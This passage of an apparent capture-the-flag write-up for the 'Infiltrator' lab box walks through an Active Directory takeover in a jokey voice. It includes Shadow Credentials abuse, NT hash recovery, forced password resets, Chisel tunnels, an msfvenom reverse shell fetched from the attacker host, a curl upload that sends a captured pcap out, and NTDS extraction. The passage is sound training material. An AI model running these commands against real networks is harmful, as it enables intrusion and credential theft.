+<p>Now that we’ve yeeted <code v-pre>GenericAll</code> onto the OU like it’s a cursed enchantment, our permissions have <strong>trickled down</strong> to lil’ <code v-pre>e.rodriguez</code> too. BloodHound’s over here grinning like:</p>
+<blockquote>
+<p>“Congrats, you just unlocked the side quest to <strong><code v-pre>m.harris</code></strong>.”</p>
+</blockquote>
+<p><figure class="content-center">
+    <img src="../../../../assets/images/writeups/infiltrator/bh-clark-to-harris.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>So how do we get spicy with this? We’re about to hit <code v-pre>e.rodriguez</code> with <strong>Shadow Credentials</strong>—basically stuffing a fake cert into his account like it’s a USB Rubber Ducky in a coffee shop laptop.</p>
+<p>This lets us <strong>Pass the Certificate</strong> using PKINIT, snag a TGT, and suddenly we’re <code v-pre>e.rodriguez</code> now. It’s like Face/Off but for Active Directory. Kerberos never saw it coming.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ bloodyAD --host dc01.infiltrator.htb -d infiltrator.htb -u 'l.clark' -p 'WAT?watismypass!' add shadowCredentials 'e.rodriguez'
+[+] KeyCredential generated with following sha256 of RSA key: 21db2d646e4fd3177d1c18717161109ed382cae2e6ed5529cf1589e41a38ad3c
+No outfile path was provided. The certificate(s) will be stored with the filename: LN43uoBF
+[+] Saved PEM certificate at path: LN43uoBF_cert.pem
+[+] Saved PEM private key at path: LN43uoBF_priv.pem
+A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
+Run the following command to obtain a TGT:
+python3 PKINITtools/gettgtpkinit.py -cert-pem LN43uoBF_cert.pem -key-pem LN43uoBF_priv.pem infiltrator.htb/e.rodriguez LN43uoBF.ccache
+
+$ python3 PKINITtools/gettgtpkinit.py -cert-pem LN43uoBF_cert.pem -key-pem LN43uoBF_priv.pem infiltrator.htb/e.rodriguez LN43uoBF.ccache
+2024-09-01 12:36:01,801 minikerberos INFO     Loading certificate and key from file
+INFO:minikerberos:Loading certificate and key from file
+2024-09-01 12:36:01,812 minikerberos INFO     Requesting TGT
+INFO:minikerberos:Requesting TGT
+2024-09-01 12:36:24,016 minikerberos INFO     AS-REP encryption key (you might need this later):
+INFO:minikerberos:AS-REP encryption key (you might need this later):
+2024-09-01 12:36:24,016 minikerberos INFO     35baa0aa822a3ef8d83996e27d41606658fd9f2a836639d7b8ed7c1f95b7a678
+INFO:minikerberos:35baa0aa822a3ef8d83996e27d41606658fd9f2a836639d7b8ed7c1f95b7a678
+2024-09-01 12:36:24,028 minikerberos INFO     Saved TGT to file
+INFO:minikerberos:Saved TGT to file</code></pre>
+</doc-codeblock></div>
+<p>Having obtained the TGT, we can conduct an UnPAC-the-hash to recover the NT hash of the target account.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ export KRB5CCNAME=LN43uoBF.ccache
+$ python3 PKINITtools/getnthash.py infiltrator.htb/e.rodriguez -key 35baa0aa822a3ef8d83996e27d41606658fd9f2a836639d7b8ed7c1f95b7a678 -dc-ip 10.129.149.83
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Using TGT from cache
+Recovered NT Hash
+b02e97f2fdb5c3d36f77375383449e56</code></pre>
+</doc-codeblock></div>
+<p>Boom, we just snagged the NT Hash of <code v-pre>e.rodriguez</code> like a digital pickpocket in a hacker’s convention. Now it’s time to boss up and slap this user into the <strong>CHIEFS MARKETING</strong> group — because who doesn’t wanna be a marketing chief.</p>
+<p>While we’re at it, we’re gonna <em>force</em> poor <code v-pre>m.harris</code> to change their password faster than you ghost your ex. But first, don’t forget to pimp out your <code v-pre>/etc/krb5.conf</code> file with the right settings or Kerberos will just laugh at you like you showed up to a sword fight with a butter knife.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-none"><code v-pre class="language-none">[libdefaults]
+        default_realm = INFILTRATOR.HTB
+
+[realms]
+        INFILTRATOR.HTB = {
+                kdc = dc01.infiltrator.htb
+                admin_server = dc01.infiltrator.htb
+        }
+
+[domain_realm]
+        .infiltrator.htb = INFILTRATOR.HTB
+        infiltrator.htb = INFILTRATOR.HTB
+
+[logging]
+#       kdc = CONSOLE</code></pre>
+</doc-codeblock></div>
+<p>We add ourself to the target group and force a password change.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ bloodyAD --host 10.10.11.31 -d infiltrator.htb -u &quot;e.rodriguez&quot; -p ':b02e97f2fdb5c3d36f77375383449e56' add groupMember 'CHIEFS MARKETING' 'e.rodriguez'
+[+] e.rodriguez added to CHIEFS MARKETING
+
+$ bloodyAD --host 10.10.11.31 -d infiltrator.htb -u &quot;e.rodriguez&quot; -p ':b02e97f2fdb5c3d36f77375383449e56' set password 'm.harris' 'Pwn3d_by_ACLs!'</code></pre>
+</doc-codeblock></div>
+<p>Since <code v-pre>m.harris</code> is playing the <em>protected user</em> card like the VIP of Active Directory, we gotta do the whole “request a TGT and flex Kerberos auth” dance again.</p>
+<p>No password? No problem — just slide into Evil-WinRM using the magic <code v-pre>--realm</code> flag with your shiny ticket instead of a boring old password. It’s like showing up to the party with a golden invite while everyone else is stuck outside sweating their creds.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ getTGT.py 'infiltrator.htb/m.harris:NewP@ssword2024' -dc-ip 10.10.11.31
+[*] Saving ticket in m.harris.ccache
+
+$ export KRB5CCNAME=m.harris.ccache
+$ evil-winrm -i dc01.infiltrator.htb -u 'm.harris' --realm INFILTRATOR.HTB </code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="root">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#root">#</doc-anchor-trigger>
+        <span>Root</span>
+    </h2>
+</doc-anchor-target>
+<p>After logging in, we find a few zip files in <code v-pre>C:\ProgramData\Output Messenger Server\Temp&gt;</code>. Inside the <code v-pre>OutputMessengerMysql.zip</code> we find a <code v-pre>OutputMysql.ini</code> that contains a password for port 14406.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-none"><code v-pre class="language-none">$ cat OutputMysql.ini
+[SETTINGS]
+SQLPort=14406
+Version=1.0.0
+
+[DBCONFIG]
+DBUsername=root
+DBPassword=ibWijteig5
+DBName=outputwall
+
+[PATHCONFIG]
+;mysql5.6.17
+MySQL=mysql
+Log=log
+def_conf=settings
+MySQL_data=data
+Backup=backup</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="unintended-path">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#unintended-path">#</doc-anchor-trigger>
+        <span>Unintended Path</span>
+    </h2>
+</doc-anchor-target>
+<p>Since the database is running with admin powers like it’s the kingpin of this system, we just casually port-forward that juicy MySQL on port 14406 and grab the root flag like a boss.<br />
+Dropped Chisel on the target because who doesn’t love a good reverse tunnel flex?</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ ./chisel server --reverse
+PS C:\&gt; .\chisel.exe client 10.10.14.14:8080 R:8090:127.0.0.1:14406
+
+$ mysql -u root -p'ibWijteig5' -P 8090 --ssl=off
+MariaDB [outputwall]&gt; use outputwall;
+MariaDB [outputwall]&gt; select LOAD_FILE(&quot;C:/Users/Administrator/Desktop/root.txt&quot;);</code></pre>
+</doc-codeblock></div>
+<p>Easy mode activated — root flag, served on a silver platter. Now buckle up, because it’s time to dive into the <em>actual</em> intended way to get root. Spoiler: it’s not this chill.</p>
+<doc-anchor-target id="intended-path-windows-client-needed">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#intended-path-windows-client-needed">#</doc-anchor-trigger>
+        <span>Intended Path (Windows Client needed)</span>
+    </h2>
+</doc-anchor-target>
+<p>From here on out, we’re hopping into a Windows VM because… well, reasons. Spoiler alert: it gets messy and way more fun. If you still have the TGT ticket for <code v-pre>m.harris</code> chilling somewhere, just yank it over and convert to a Kirbi file like a pro hacker. But nah, I’m gonna show you how to climb back up from <code v-pre>e.rodriguez</code> to <code v-pre>m.harris</code> — Windows style.</p>
+<div class="flex mb-6">
+    <div class="shrink-0 w-1.5 rounded-tl-lg rounded-bl-lg bg-callout-warning"></div>
+    <div class="flex w-full py-4 border border-l-0 rounded-tr-lg rounded-br-lg doc-callout bg-callout-base-bg border-callout-base-border" role="alert">
+        <div class="flex items-center ml-4 h-7">
+            <svg xmlns="http://www.w3.org/2000/svg" class="mb-px text-callout-warning" width="22" height="22" viewBox="0 0 24 24" role="presentation">
+                <g fill="currentColor"><g>
+                    <path d="M22.48 15.59L14.01 1.45A2.968 2.968 0 0012.16.09c-.78-.19-1.58-.07-2.27.35-.41.25-.76.6-1.01 1.01v.01L.4 15.6c-.83 1.43-.33 3.27 1.1 4.1.45.26.95.4 1.48.4h16.95c.8-.01 1.55-.33 2.11-.9.56-.57.87-1.33.86-2.13a3.04 3.04 0 00-.42-1.48zm-1.87 2.21c-.19.19-.44.3-.69.3H2.99c-.17 0-.34-.05-.49-.13a.992.992 0 01-.37-1.35L10.6 2.48c.08-.14.2-.25.34-.33a.992.992 0 011.37.33l8.46 14.13c.09.15.13.32.13.49 0 .26-.1.51-.29.7z"></path>
+                    <path d="M11.45 12.1c.55 0 1-.45 1-1v-4c0-.55-.45-1-1-1s-1 .45-1 1v4c0 .56.45 1 1 1zM11.46 14.1c-.56 0-1 .45-1 1s.45 1 1 1 1-.45 1-1-.45-1-1-1z"></path>
+                </g></g>
+            </svg>
+        </div>
+        <div class="pr-5 ml-3 w-full">
+<p>If you get hit with that annoying <code v-pre>KRB_AP_ERR_SKEW (Clock skew too great)</code> error, it means your VM clock is throwing a tantrum and isn’t synced with the domain controller. Fix that <em>before</em> joining the domain — otherwise you’re in for a world of pain and might need to do a time travel rollback.</p>
+        </div>
+    </div>
+</div>
+<p>First we will download the <code v-pre>bloodAD.exe</code> compiled binary and run the following commands:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">PS C:\&gt; C:\Tools\bloodyAD.exe --host 10.10.11.31 -d infiltrator.htb -u 'e.rodriguez' -p ':b02e97f2fdb5c3d36f77375383449e56' add groupMember 'CHIEFS MARKETING' 'e.rodriguez'
+[+] e.rodriguez added to CHIEFS MARKETING
+
+PS C:\&gt; C:\Tools\bloodyAD.exe --host 10.10.11.31 -d infiltrator.htb -u 'e.rodriguez' -p ':b02e97f2fdb5c3d36f77375383449e56' set password 'm.harris' 'Pwn3d_by_ACLs!'
+[+] Password changed successfully!
+
+PS C:\&gt; python C:\Tools\Python\getTGT.py 'infiltrator.htb/m.harris:Pwn3d_by_ACLs!' -dc-ip 10.10.11.31
+[*] Saving ticket in m.harris.ccache</code></pre>
+</doc-codeblock></div>
+<p>Next up, before Kerberos can party on our Windows attack VM, we gotta join it to the domain.  Hop into: <code v-pre>Settings &gt; Accounts &gt; Access work or school &gt; Connect</code><br />
+Punch in <code v-pre>infiltrator.htb</code> as the domain and log in with any domain account (e.g. <code v-pre>l.clark</code>).</p>
+<p>Another pro tip: Make sure your VPN interface’s DHCP server points to the DC IP (10.10.11.31), otherwise Kerberos throws a hissy fit.</p>
+<p>If it asks to add an account, just politely decline. Restart your VM, sign in as a <strong>local user</strong>, and don’t forget to slap that firewall off — this isn’t a hotel lobby.</p>
+<p><figure class="content-center">
+    <img src="../../../../assets/images/writeups/infiltrator/join-ad.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>Next we can convert the <code v-pre>ccache</code> file to Kirbi and inject our ticket into memory using Rubeus.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">PS C:\&gt; python C:\Tools\Python\ticketConverter.py .\m.harris.ccache m.harris.kirbi
+[*] converting ccache to kirbi...
+[+] done
+
+PS C:\&gt; C:\Tools\Rubeus.exe ptt /ticket:m.harris.kirbi</code></pre>
+</doc-codeblock></div>
+<p>Aight we’re in. Since <code v-pre>m.harris</code> got that sweet Remote Management privilege, we Kerberos-yeet ourselves into a WinRM shell like some kind of enterprise wizard. Once inside, it’s business as usual: HTTP server up, chisel in hand, and we&#x27;re tunneling like it’s 1999.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">PS C:\&gt; python -m http.server
+PS C:\&gt; winrm set winrm/config/client '@{TrustedHosts=&quot;*&quot;}'
+PS C:\&gt; Enter-PSSession -ComputerName dc01.infiltrator.htb -Authentication Kerberos
+[dc01.infiltrator.htb]: PS C:\Users\M.harris\Documents&gt; certutil -f -urlcache http://10.10.14.7:8000/chisel.exe C:\Windows\Temp\chisel.exe</code></pre>
+</doc-codeblock></div>
+<p>Drop the chisel. Tunnel the ports. Talk to the DB like a boss.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">PS C:\&gt; C:\Tools\chisel.exe server --reverse
+[dc01.infiltrator.htb]: PS C:\Windows\Temp&gt; .\chisel.exe client 10.10.14.7:8080 R:14121:127.0.0.1:14406</code></pre>
+</doc-codeblock></div>
+<p>Inside the <code v-pre>ot_wall_posts</code> table, we uncover some juicy lore straight from the dev diaries:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-none"><code v-pre class="language-none">Hey team, I\'m here! In this screenshot, I\'ll guide you through using the app UserExplorer.exe. It works seamlessly with dev credentials, but remember, it\'s versatile and functions with any credentials. Currently, we\'re exploring the default option. Stay tuned for more updates!\n\n\&quot;UserExplorer.exe -u m.harris -p D3v3l0p3r_Pass@1337! -s M.harris
+
+Hey team,\n\nWe\'ve identified a security concern: some users and our domain (dc01.infiltrator.htb) have pre-authentication disabled on kerberos. \nNo need to panic! Our vigilant team is already on it and will work diligently to fix this. In the meantime, stay vigilant and be cautious about any potential security risks</code></pre>
+</doc-codeblock></div>
+<p>Thanks for the creds, mystery dev. Now, according to OutputMessenger’s official docs (yes, we actually read those), the app needs a buffet of ports open to do its thing. Let’s open the floodgates:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">PS C:\&gt; Invoke-Command -ScriptBlock { C:\Windows\Temp\chisel.exe client 10.10.14.7:8080 R:14121:127.0.0.1:14121 R:14122:127.0.0.1:14122 R:14123:127.0.0.1:14123 R:14124:127.0.0.1:14124 } -Session $Session
+
+2024/09/06 07:22:02 client: Connected (Latency 523.4µs)</code></pre>
+</doc-codeblock></div>
+<p>We can now get access to OutputMessenger on <code v-pre>http://localhost:14123</code> with the credentials from the posts. In the <code v-pre>Dev_Chat</code> they talk about the <code v-pre>UserExplorer.exe</code>, also the Admin said the following:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-none"><code v-pre class="language-none">Hello everyone 😃
+There have been some complaints regarding the stability of the &quot;Output Messenger&quot; application. In case you encounter any issues, please make sure you are using a Windows client. The Linux version is outdated.</code></pre>
+</doc-codeblock></div>
+<p>Translation:</p>
+<blockquote>
+<p>“Linux users? Sorry babes, go get a real OS.”</p>
+</blockquote>
+<p>So yeah, looks like we’re installing the Windows client if we want this app to actually function. Time to bootleg some enterprise nostalgia.</p>
+<doc-anchor-target id="outputmessenger-windows-client">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#outputmessenger-windows-client">#</doc-anchor-trigger>
+        <span>OutputMessenger Windows Client</span>
+    </h3>
+</doc-anchor-target>
+<p>So we spin up the Windows OutputMessenger client (don’t ask how we still trust this thing), login as our dev-king <code v-pre>m.harris</code> using the creds from the earlier DB leak: <code v-pre>D3v3l0p3r_Pass@1337!</code></p>
+<p><figure class="content-center">
+    <img src="../../../../assets/images/writeups/infiltrator/om-login-win-client.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>Now that we’re inside, we peek into the dev chat and snatch a copy of <code v-pre>UserExplorer.exe</code>. Because apparently in this workplace, sensitive tools are passed around in chat messages like memes.</p>
+<p><figure class="content-center">
+    <img src="../../../../assets/images/writeups/infiltrator/om-userexplorer.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>Naturally, we drop this mystery EXE into <strong>dnSpy</strong>, crack it open, and bingo — inside the <code v-pre>LdapApp</code> class is the hardcoded equivalent of a security red flag:</p>
+<p><figure class="content-center">
+    <img src="../../../../assets/images/writeups/infiltrator/om-userexplorer-password.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-none"><code v-pre class="language-none">string text4 = &quot;winrm_svc&quot;;
+string cipherText = &quot;TGlu22oo8GIHRkJBBpZ1nQ/x6l36MVj3Ukv4Hw86qGE=&quot;;
+text2 = Decryptor.DecryptString(&quot;b14ca5898a4e4133bbce2ea2315a1916&quot;, cipherText)</code></pre>
+</doc-codeblock></div>
+<p>So here’s the tea:</p>
+<ul>
+<li>Username is <code v-pre>winrm_svc</code></li>
+<li>Encrypted password is stored as a Base64 blob</li>
+<li>Decryption key is hardcoded</li>
+<li>IV is literally all zeroes (because who needs cryptographic hygiene anyway)</li>
+</ul>
+<p>The <code v-pre>DecryptString</code> function just base64-decodes the ciphertext, then runs AES-CBC using that key and the null IV. Easy bake oven level decryption. We can decrypt this with the following Python script:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-python"><code v-pre class="language-python">from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+from cryptography.hazmat.primitives import serialization
+from cryptography.hazmat.backends import default_backend
+import base64
+
+def decrypt_string(key: str, cipher_text: str) -&gt; str:
+    key_bytes = key.encode('utf-8')
+    cipher_bytes = base64.b64decode(cipher_text)
+
+    if len(key_bytes) not in {16, 24, 32}:
+        raise ValueError(&quot;Key must be 16, 24, or 32 bytes long&quot;)
+
+    cipher = Cipher(algorithms.AES(key_bytes), modes.CBC(b'\x00' * 16), backend=default_backend())
+    decryptor = cipher.decryptor()
+
+    decrypted_bytes = decryptor.update(cipher_bytes) + decryptor.finalize()
+
+    return decrypted_bytes.decode('utf-8')
+
+key = 'b14ca5898a4e4133bbce2ea2315a1916'
+cipher_text = 'TGlu22oo8GIHRkJBBpZ1nQ/x6l36MVj3Ukv4Hw86qGE='
+
+print(decrypt_string(key,decrypt_string(key, cipher_text)))</code></pre>
+</doc-codeblock></div>
+<p>We recover the password as <code v-pre>WinRm@$svc^!^P</code>. Now we can also WinRM with this user, which saves us some headaches of resetting passwords and grabbing TGTs.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">PS C:\&gt; $SecPassword = ConvertTo-SecureString 'WinRm@$svc^!^P' -AsPlainText -Force
+PS C:\&gt; $Cred = New-Object System.Management.Automation.PSCredential('infiltrator.htb\winrm_svc', $SecPassword)
+PS C:\&gt; Enter-PSSession -Computername 10.10.11.31 -Authentication Negotiate -Credential $Cred</code></pre>
+</doc-codeblock></div>
+<p>We can also login to Output Messenger as this user and find a spicy little post from <strong>Martinez</strong>, casually admitting he dropped his password in the <strong>Chiefs_Marketing_chat</strong> room like it&#x27;s just another Tuesday. The <code v-pre>winrm_svc</code> account also has a note with the <code v-pre>lan_management</code> api key.</p>
+<p><figure class="content-center">
+    <img src="../../../../assets/images/writeups/infiltrator/om-api-key.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-none"><code v-pre class="language-none">lan_management api key 558R501T5I6024Y8JV3B7KOUN1A518GG</code></pre>
+</doc-codeblock></div>
+<p>Now we can proceed to see what we can do with the API key. Reading the docs of OM, this is one of the request that can be made.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-http"><code v-pre class="language-http">Request Headers: 
+GET /api/chatrooms/[ROOM]
+Accept: application/json, text/javascript, */*;  
+API-KEY: 558R501T5I6024Y8JV3B7KOUN1A518GG 
+Host: infiltrator.htb:14125</code></pre>
+</doc-codeblock></div>
+<p>Therefore we also need to forward port 14125 and send the following request.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">curl.exe -H 'Accept: application/json, text/javascript, */*;' -H 'API-KEY: 558R501T5I6024Y8JV3B7KOUN1A518GG' -H 'Host: infiltrator.htb:14125' http://localhost:14125/api/chatrooms/Chiefs_Marketing_chat
+{&quot;row&quot;:{&quot;room&quot;:&quot;Chiefs_Marketing_chat&quot;,&quot;roomusers&quot;:&quot;A.walker|0,O.martinez|0&quot;},&quot;success&quot;:true}</code></pre>
+</doc-codeblock></div>
+<p>Alright, we indeed see that Martinez is part of this chat room. In order to read the chat logs, we need to also find the <code v-pre>roomkey</code> according to the docs. We have to start looking for this on the DC. We log in as <code v-pre>winrm_svc</code> and find an <code v-pre>OM.db3</code> file in the <code v-pre>AppData</code> folder of this user. We download it and open it with a database viewer. In one of the tables we find the key.</p>
+<p><figure class="content-center">
+    <img src="../../../../assets/images/writeups/infiltrator/om-room-key.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>Now we can attempt to read the logs by specifying a date range.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">curl.exe -H 'Accept: application/json, text/javascript, */*;' -H 'API-KEY: 558R501T5I6024Y8JV3B7KOUN1A518GG' -H 'Host: localhost:14125' 'http://localhost:14125/api/chatrooms/logs?roomkey=20240220014618@conference.com&amp;fromdate=2024/02/01&amp;todate=2024/03/01'</code></pre>
+</doc-codeblock></div>
+<p>At the bottom, we find the credentials for <code v-pre>o.martinez</code>.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-none"><code v-pre class="language-none">o.martinez:m@rtinez@1996!</code></pre>
+</doc-codeblock></div>
+<p>Unfortunately, these are not domain credentials but we can still login to the OM client again. The message with <code v-pre>winrm_svc</code> also mentioned the following:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-none"><code v-pre class="language-none">I'm getting random website pop-ups on my desktop every day at 09:00 AM. I suspect there's an issue with the app</code></pre>
+</doc-codeblock></div>
+<p>So martinez been cryin in the club (OM chat) like</p>
+<blockquote>
+<p>&quot;wahh my desktop opening random websites at 9AM <span class="docs-emoji">&#x1F62D;</span>&quot;</p>
+</blockquote>
+<p>Bro. you fr just told me you got <strong>task scheduler malware edition</strong> installed and running.</p>
+<p>From the application, there is a feature to run programs and open website on a designated time. When we try this out and for instance just launch the default browser application, it indeed opens on the local machine. Just a spicy lil feature called <strong>&quot;Scheduled Events&quot;</strong>, which basically goes:</p>
+<blockquote>
+<p>“hey, wanna open calc.exe on ur coworker&#x27;s PC at 3am? go for it.”</p>
+</blockquote>
+<p>I also noticed that Martinez always is in the idle state so maybe we can upload a reverse shell to the DC and execute it in the context of Martinez. Let&#x27;s try!</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ msfvenom -p windows/x64/shell_reverse_tcp lhost=10.10.14.7 lport=443 -f exe -o payload.exe
+
+[10.10.11.31]: PS C:\Windows\Temp&gt; curl.exe http://10.10.14.7:8000/payload.exe -o payload.exe
+
+PS C:\&gt; C:\Tools\nc64.exe -nlvp 443</code></pre>
+</doc-codeblock></div>
+<p>Payload.exe goes brrr. Now I create a new event with a nearby time, logout and login as <code v-pre>k.turner</code> with pass <code v-pre>MessengerApp@Pass!</code> and wait. You also need to have the same binary in your local machine in order to create the event. Just make sure martinez stays online. If not? Cry harder, reset the box, and try again. Cuz when that scheduled payload hits, you&#x27;re not just in the room… <strong>you’re in his session.</strong></p>
+<div class="flex mb-6">
+    <div class="shrink-0 w-1.5 rounded-tl-lg rounded-bl-lg bg-callout-info"></div>
+    <div class="flex w-full py-4 border border-l-0 rounded-tr-lg rounded-br-lg doc-callout bg-callout-base-bg border-callout-base-border" role="alert">
+        <div class="flex items-center ml-4 h-7">
+            <svg xmlns="http://www.w3.org/2000/svg" class="mb-px text-callout-info" width="22" height="22" viewBox="0 0 24 24" role="presentation">
+                <g fill="currentColor"><g>
+                    <path d="M12 1C5.93 1 1 5.93 1 12s4.93 11 11 11 11-4.93 11-11S18.07 1 12 1zm0 20c-4.96 0-9-4.04-9-9s4.04-9 9-9 9 4.04 9 9-4.04 9-9 9z"></path>
+                    <path d="M12 11c-.55 0-1 .45-1 1v4c0 .55.45 1 1 1s1-.45 1-1v-4c0-.55-.45-1-1-1zM12.01 7c-.56 0-1 .45-1 1s.45 1 1 1 1-.45 1-1-.45-1-1-1z"></path>
+                    <path fill="none" d="M0 0h24v24H0z"></path>
+                </g></g>
+            </svg>
+        </div>
+        <div class="pr-5 ml-3 w-full">
+<p>At this point you can switch back to a Linux VM or continue on Windows if you prefer ;)</p>
+        </div>
+    </div>
+</div>
+<doc-anchor-target id="pcap-analysis-and-bitlocker-decrypt">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#pcap-analysis-and-bitlocker-decrypt">#</doc-anchor-trigger>
+        <span>PCAP Analysis and BitLocker Decrypt</span>
+    </h3>
+</doc-anchor-target>
+<p>So we pokin’ around in Martinez’s AppData, and guess what man’s got tucked away in the digital sock drawer? A juicy lil <code v-pre>.pcapng</code> file sittin’ there like it didn’t just witness a whole cybercrime. File’s named <code v-pre>network_capture_2024.pcapng</code>—real subtle.</p>
+<p>Naturally, we snatch it. Set up a quick n’ dirty Python upload server on our end, then slap that file across the internet like we’re trading bootleg mixtapes.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-none"><code v-pre class="language-none">python -m uploadserver
+PS C:\Users\O.martinez\AppData&gt; curl.exe http://10.10.14.7:8000/upload -F &quot;files=@network_capture_2024.pcapng&quot; -f &quot;token=helloworld&quot;</code></pre>
+</doc-codeblock></div>
+<p>Now inside the capture, we dig up two little digital treasures:</p>
+<ol>
+<li>A sketchy-looking file labeled <code v-pre>BitLocker-backup.7z</code> (because encrypting your own encryption is totally normal, right?)</li>
+<li>A cleartext password floating inside an API call: <code v-pre>M@rtinez_P@ssw0rd!</code> dropped casually in a <code v-pre>change_auth_token</code> request. Like bro, you good?</li>
+</ol>
+<p>Armed with the creds, we RDP into Martinez’s box. Like legally? No. But efficiently? Absolutely.</p>
+<p>Anyway, this zip file’s got a password on it. Of course it does. But we ain’t scared of some password-protected nonsense. We hit it with that <code v-pre>zip2john</code> → <code v-pre>hashcat</code> combo and let RockYou do what RockYou does best.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-none"><code v-pre class="language-none">zip2john BitLocker-backup.7z
+
+hashcat bitlocker.hash $ROCKYOU</code></pre>
+</doc-codeblock></div>
+<p>Password? Man, it’s just <code v-pre>zipper</code>. Truly the creativity is off the charts. Inside? The BitLocker recovery key. That’s like finding the keys to someone’s panic room inside their junk drawer.</p>
+<p><figure class="content-center">
+    <img src="../../../../assets/images/writeups/infiltrator/bitlocker-key.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>We use that shiny new key to unlock the drive like we’re defusing a bomb in a B-movie, and what do we find?</p>
+<p>Oh, just a full Windows Server 2012 backup sittin’ in the Documents folder of <code v-pre>Administrator</code>. You know, just casual enterprise-grade secrets lying around like loose change. And inside that backup? The crown jewel: <code v-pre>NTDS.dit</code> and the registry hives.</p>
+<p>Time to fire up <code v-pre>ntdsdotsqlite</code>, turn that chunky binary blob into an actual database we can poke at like the gremlins we are:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ ntdsdotsqlite NTDS.DIT --system SYSTEM -o NTDS.sqlite
+
+sqlite3 NTDS.sqlite
+sqlite&gt; select description from user_accounts;
+Built-in account for administering the computer/domain
+Built-in account for guest access to the computer/domain
+Key Distribution Center Service Account
+User Security and Management Specialist
+l@n_M@an!1331
+Head of Development Department</code></pre>
+</doc-codeblock></div>
+<p>We found the password for the <code v-pre>lan_management</code> account.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ nxc smb 10.10.11.31 -u 'lan_managment' -p 'l@n_M@an!1331' -d infiltrator.htb
+SMB         10.10.11.31     445    DC01             [+] infiltrator.htb\lan_managment:l@n_M@an!1331</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="bloodhound-lan_managment-to-infiltrator_svc">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#bloodhound-lan_managment-to-infiltrator_svc">#</doc-anchor-trigger>
+        <span>Bloodhound LAN_MANAGMENT to INFILTRATOR_SVC</span>
+    </h3>
+</doc-anchor-target>
